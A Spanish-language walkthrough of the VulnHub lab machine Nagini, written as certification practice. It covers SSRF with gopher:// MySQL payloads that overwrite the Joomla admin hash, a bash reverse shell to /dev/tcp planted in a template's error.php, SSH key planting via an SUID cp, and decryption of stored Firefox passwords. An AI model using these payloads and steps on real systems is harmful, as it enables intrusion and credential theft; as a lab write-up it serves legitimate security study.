# Nagini

Write-up de la máquina nagini de la plataforma [vulnhub](https://www.vulnhub.com) (en un ejercicio de laboratorio para eCPPTv2).

![Aragog cover](images/cover.jpg)

## Tabla de Contenido <!-- omit from toc -->

- [Introducción](#introducción)
	- [Técnicas vistas / Tags](#técnicas-vistas--tags)
	- [Estadísticas](#estadísticas)
- [Reconocimiento](#reconocimiento)
	- [Escaneo de host](#escaneo-de-host)
		- [Escaneo completo de puertos](#escaneo-completo-de-puertos)
		- [Escaneo específico](#escaneo-específico)
- [Enumeración](#enumeración)
	- [Servicios](#servicios)
		- [http - 80](#http---80)
- [Explotación](#explotación)
	- [SSRF](#ssrf)
- [Post Explotación](#post-explotación)
	- [Escalación de privilegios](#escalación-de-privilegios)
		- [www-data → snape](#www-data--snape)
		- [www-data → hermoine](#www-data--hermoine)
		- [hermoine → root](#hermoine--root)
- [Notas adicionales](#notas-adicionales)
- [Referencias](#referencias)


## Introducción

### Técnicas vistas / Tags

- Joomla
- HTTP3
- quic
- SSRF - Server Side Request Forgery
- gopher
- SUID cp
- firepwd
- Firefox password cracking

### Estadísticas

| Característica | Descripción |
|---|---|
| Nombre | [Nagini](https://www.vulnhub.com/entry/harrypotter-nagini,689/) |
| OS | Linux |
| Dificultad asignada | Media |
| Creadores | [Mansoor R](https://www.vulnhub.com/author/mansoor-r,794/) |

## Reconocimiento

### Escaneo de host

#### Escaneo completo de puertos

```bash
subnet="10.10.0." && for ip in {0..254}; do ping -c 1 -t 1 $subnet$ip > /dev/null && echo "[+] Host found $subnet$ip"; done
[+] Host found 10.10.0.128 # Aragog
[+] Host found 10.10.0.129

└─$ nmap -sT --min-rate 5000 -v -p- -open -oG nmap/all_ports_st $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 20:43 EST
Initiating Ping Scan at 20:43
Scanning 10.10.0.129 [2 ports]
Completed Ping Scan at 20:43, 2.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:43
Completed Parallel DNS resolution of 1 host. at 20:43, 2.01s elapsed
Initiating Connect Scan at 20:43
Scanning 10.10.0.129 [65535 ports]
Discovered open port 22/tcp on 10.10.0.129
Discovered open port 80/tcp on 10.10.0.129
Completed Connect Scan at 20:44, 44.54s elapsed (65535 total ports)
Nmap scan report for 10.10.0.129
Host is up (0.00053s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds
```

#### Escaneo específico

```bash
└─$ nmap -sCV -p 22,80 -open -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 20:45 EST
Nmap scan report for 10.10.0.129
Host is up (0.00082s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
```

## Enumeración

### Servicios

#### http - 80

Después de realizar ejecutar `ffuf` se identificaron las rutas:

- `/note.txt`.
- `/joomla`.

Donde en el contenido de la ruta `/note.txt` hace referencia a que se encuentra ejecutándose un servidor web de tipo quic.

```text
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin
```

Y la ruta de `/joomla` expone un gestor de contenido. Al ejecutar `joomscan` se identificó un archivo de configuración respaldado.

```bash
└─$ joomscan --ec -u "http://10.10.0.129/joomla"
    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

... Datos truncados

[+] Checking sensitive config.php.x file
[++] Readable config file is found
 config file path : http://10.10.0.129/joomla/configuration.php.bak
```

Dada la extención se pudo visualizar su contenido.

```bash
└─$ curl http://10.10.0.129/joomla/configuration.php.bak
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Joomla CMS';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $debug_lang_const = '1';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'goblin';
        public $password = '';
        public $db = 'joomla';
        public $dbprefix = 'joomla_';
        public $live_site = '';
        public $secret = 'ILhwP6HTYKcN7qMh';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $ftp_host = '';
        public $ftp_port = '';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'site_admin@nagini.hogwarts';
        public $fromname = 'Joomla CMS';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = '';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/joomla/administrator/logs';
        public $tmp_path = '/var/www/html/joomla/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
```

Posterior a la mención del servidor HTTP3 se buscó información al respecto y se encontró [un cliente](https://github.com/cloudflare/quiche) que permite la interacción con el servidor. Al realizar la instalación y navegar por medio de este, se obtuvo la siguiente página, exponiendo una ruta en el servidor web incial.

```bash
└─$ ./http3-client https://10.10.0.129
<html>
        <head>
        <title>Information Page</title>
        </head>
        <body>
                Greetings Developers!!

                I am having two announcements that I need to share with you:

                1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
                2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


                Regards,
                site_admin
        </body>
</html>
```

## Explotación

### SSRF

Al identificar la vulnerabilidad y poder obtener archivos mediante payloads como `file:///etc/passwd` , descubrimiento de puertos internos abiertos, etc. se identificó la herramienta `gopherus` que permite generar payloads para establecer conexiones y poder enumerar otros tipos de servicios mediante el protocolo `gopher://` y dado que se cuenta con credenciales de la base de datos local se hizo uso de esta para buscar dentro de esta.

```bash
└─$ python gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: show databases;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

Sin embargo, a pesar de contar con el payload adecuado, se tuvo que mandar múltiples veces ya que no siempre fue interpretado.

![Lista de bases de datos](images/exploit_1.png)

Posteriormente se extrajo el hash del usuario administrador de joomla, mediante:

```bash
└─$ python gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: use joomla;select username,password from joomla_users;

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%37%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%73%65%6c%65%63%74%20%75%73%65%72%6e%61%6d%65%2c%70%61%73%73%77%6f%72%64%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

![Hash de usuario de joomla](images/exploit_2.png)

Para posteriormente crackearlo haciéndo uso de `jhon`, sin embargo, no fue satisfactorio el proceso por lo que se intentó modificar el hash del usuario identificado en la base de datos, generando un hash previamente.

```bash
└─$ echo -n 'srrequiem' | md5sum
7482dd7f2bbb7f277796bcdfb52e717e  -
```

Para después sustituir su valor por el hash actual, mediante la consulta.

```bash
└─$ python gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: use joomla;update joomla_users set password = '7482dd7f2bbb7f277796bcdfb52e717e' where username = 'site_admin';

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%70%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%20%3d%20%27%37%34%38%32%64%64%37%66%32%62%62%62%37%66%32%37%37%37%39%36%62%63%64%66%62%35%32%65%37%31%37%65%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%20%3d%20%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

Logrando así acceder al panel de joomla.

![Panel de joomla](images/exploit_3.png)

Para ganar acceso a la máquina se modificó la página de error del template usado seleccionando en el panel superior del sitio `Extensions > Templates > Templates > Seleccionar template en uso` y dentro del modo de "edición" se seleccionó y modificó el archivo `error.php` poniendo una instrucción de ejecución de comandos como:

```php
system('bash -c "bash -i >& /dev/tcp/10.10.0.128/1234 0>&1"');
```

Guardando el archivo y disparándolo con un error HTTP 404, por ejemplo, navegando a `http://10.10.0.129/joomla/index.php/rutainexistente`.

![Reverse shell en error.php](images/exploit_4.png)

*Dado que el presente write-up se trabajó en el laboratorio señalado, la conexión de la reverse shell se mandó al nodo más cercano (Aragog), en el cual, mediante `socat TCP-LISTEN:1234,fork TCP:192.168.111.162:1234` se redirigió el tráfico de red a la máquina atacante.*

Obteniendo así acceso a la máquina y el primer horrocrux.

```bash
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.111.162] from (UNKNOWN) [192.168.111.175] 49402
bash: cannot set terminal process group (854): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Nagini:/var/www/html/joomla$ cd ..
www-data@Nagini:/var/www/html$ ls -la
total 356
drwxr-xr-x  3 root     root       4096 Apr  4  2021 .
drwxr-xr-x  3 root     root       4096 Apr  3  2021 ..
-rw-r--r--  1 root     root     323790 Apr  2  2021 harry_potter_2.jpg
-rw-r--r--  1 ron      ron          63 Apr  4  2021 horcrux1.txt
-rw-r--r--  1 root     root         61 Apr  4  2021 .htaccess
-rw-r--r--  1 root     root         97 Apr  2  2021 index.html
-rw-r--r--  1 root     root        612 Apr  2  2021 index.nginx-debian.html
-rw-r--r--  1 root     root        854 Apr  4  2021 internalResourceFeTcher.php
drwxr-xr-x 17 www-data www-data   4096 Apr  3  2021 joomla
-rw-r--r--  1 root     root        234 Apr  3  2021 note.txt
www-data@Nagini:/var/www/html$ cat horcrux1.txt
horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
```

## Post Explotación

### Escalación de privilegios

#### www-data &rarr; snape

Dentro del directorio `/home/snape` se encontró el archivo `.creds.txt` al cual se tenía lectura, desencodeando el contenido en base64 se obtuvo una shell como el usuario `snape`.

```bash
www-data@Nagini:/home/snape$ ls -la
ls -la
total 32
drwxr-xr-x 4 snape snape 4096 Apr  4  2021 .
drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
www-data@Nagini:/home/snape$ cat .creds.txt
cat .creds.txt
TG92ZUBsaWxseQ==
www-data@Nagini:/home/snape$ cat .creds.txt | base64 -d && echo
cat .creds.txt | base64 -d && echo
Love@lilly
```

#### www-data &rarr; hermoine

Dentro del directorio `/home/hermoine` se encontró una copia del binario `cp` con permisos de SUID, al contar con este permiso y dado que el servicio `ssh` se encuentra disponible se podría generar una llave ssh para este usuario y pegar la pública dentro de `/home/hermione/.ssh/authorized_keys`.

```bash
# Kali
└─$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/srrequiem/.ssh/id_rsa): ./hermione_id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./hermione_id_rsa
Your public key has been saved in ./hermione_id_rsa.pub
The key fingerprint is:
SHA256:guTPHqxLBjUO/euSXDbm4CHuMHT8RwFJlcLXirZBEIo srrequiem@pwnchadnezzar
The key's randomart image is:
+---[RSA 3072]----+
|   o=oo.o        |
|. .. =.o .       |
|E.. * +..        |
|  .* B ..        |
| ..o= =.S        |
|. o.+=*o         |
|o. +oX*o         |
| o.o=+o.         |
| .. ooo          |
+----[SHA256]-----+

# Copiar contenido de ./hermione_id_rsa.pub

# Nagini
snape@Nagini:/home/hermoine$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFu+CNPc/WM1fvrT1gIfuTYmpIq6RRqTHZTP+3H22OiSHgyN2LmhQqw0EO9y6CBecm9p3vEUrI98ErzSSsZbihn7IeGlK6yaomLmiEYJphq3bzjXkqZb6nWYATqSeV3WkC6Br3bNJsZWg8AVbqlCGRL2VGca6Mw30rB6tej68Qr+1XOmDEKhjMeCD/CHqXi1r29mUBoPAT8YxhGyY9vLFgf5fLNzZRZfKWfmusiPSnxrzyKTPpuj0rmwkAOf/gC6BHKC13PwON+ykxFP1+6PiSC2TF8K87mT2KHFHwB7wQurjaVez30fAaodU5toIYj/XWhWYxZmith/fvus7H2JUqJZeULeT5fPKf1SKJXgBsM6oyHq1lr/2isNvoIb7eCAoQTdJObBCpahWhhalKC+VbxES+dVgSZ0k0v4I0zENB/snqYUAzqKprwykVKRz12Oj/hYbRk2rUj9nwcTl/Ol9WLhwaQlir5RJiTEws8a8+g5qKXTXEqel+X2WIyoQS9tc=' > /tmp/hermione.pub
snape@Nagini:/home/hermoine$ bin/su_cp /tmp/hermione.pub .ssh/authorized_keys

# Kali
└─$ ssh hermoine@10.10.0.129 -i hermione_id_rsa
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr  4 16:43:01 2021 from ::1
hermoine@Nagini:~$
```
De esta manera se podría extraer el segundo horrocrux.

```bash
hermoine@Nagini:~$ ls -la
total 28
drwxr-xr-x 6 hermoine hermoine 4096 Apr  4  2021 .
drwxr-xr-x 4 root     root     4096 Apr  4  2021 ..
drwxr-xr-x 2 hermoine hermoine 4096 Apr  4  2021 bin
drwx------ 3 hermoine hermoine 4096 Apr  4  2021 .gnupg
-r--r----- 1 hermoine hermoine   75 Apr  4  2021 horcrux2.txt
drwx------ 5 hermoine hermoine 4096 Jun  1  2019 .mozilla
drwxr-xr-x 2 hermoine hermoine 4096 Mar  9 02:53 .ssh
hermoine@Nagini:~$ cat horcrux2.txt
horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
```

#### hermoine &rarr; root

Dentro del usuario en turno, se identificaron archivos de mozilla firefox, los cuales al indagar al respecto se encontró el repositorio de [firepwd](https://github.com/lclevy/firepwd) que con los archivos dentro de `.mozilla` (key3.db o jey4.db y logins.json) permite descifrar las contraseñas protegidas de firefox.

Al copiar el `/home/hermoine/.mozilla/firefox/g2mhbq0o.default/key4.db` y `/home/hermoine/.mozilla/firefox/g2mhbq0o.default/logins.json` en la máquina local para la ejecución del script `firepwd.py`, se extrajo la contraseña de root de la siguiente manera:

```bash
└─$ python firepwd.py -d /home/srrequiem/Documents/ecpptv2_lab/2_nagini/content/
globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'2065c62fe9dc4d8352677299cc0f2cb8'
 }
entrySalt: b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'ceedd70a1cfd8295250bcfed5ff49b6c878276b968230619a2c6c51aa4ea5c8e'
 }
entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
decrypting login/password pairs
http://nagini.hogwarts:b'root',b'@Alohomora#123'
```

Teniendo así acceso a `root` y al tercer horrocrux.

```bash
hermoine@Nagini:~/.mozilla$ su -
Password:
root@Nagini:~# ls -la
total 68
drwx------  5 root root   4096 Feb  6 02:14 .
drwxr-xr-x 18 root root   4096 Apr  4  2021 ..
-rw-------  1 root root     44 Apr  4  2021 .bash_history
-rw-r--r--  1 root root    570 Apr  3  2021 .bashrc
drwx------  3 root root   4096 Mar 31  2021 .gnupg
-rw-r--r--  1 root snape   810 Apr  4  2021 horcrux3.txt
drwxr-xr-x  3 root root   4096 Feb  6 02:14 .local
-rw-------  1 root root    298 Apr  4  2021 .mysql_history
-rw-r--r--  1 root root    148 Apr  3  2021 .profile
-rw-r--r--  1 root root     74 Mar 31  2021 .selected_editor
drwx------  2 root root   4096 Mar 31  2021 .ssh
-rw-------  1 root root  13566 Apr  4  2021 .viminfo
-rw-r--r--  1 root root    213 Apr  3  2021 .wget-hsts
-rw-------  1 root root     52 Apr  4  2021 .Xauthority
root@Nagini:~# cat horcrux3.txt
  ____                            _         _       _   _
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Medium
Machine Name: Nagini
Horcruxes Hidden in this VM: 3 horcruxes

You have successfully pwned Nagini machine.
Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
```

## Notas adicionales

Dentro de la búsqueda para la extracción de las contraseñas de mozilla firefox, se encontró el script [mozilla2hashcat.py](https://fossies.org/linux/hashcat/tools/mozilla2hashcat.py) que permite extraer el hash del archivo protegido `key3.db` o `key4.db`.

## Referencias

- [quiche - HTTP3 client](https://github.com/cloudflare/quiche).
- [Hacktricks - SSRF gopher](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher).
- [Github - gopherus](https://github.com/tarunkant/Gopherus).
- [Firepwd.py, an open source tool to decrypt Mozilla protected passwords](https://github.com/lclevy/firepwd)
- [mozilla2hashcat.py](https://fossies.org/linux/hashcat/tools/mozilla2hashcat.py)
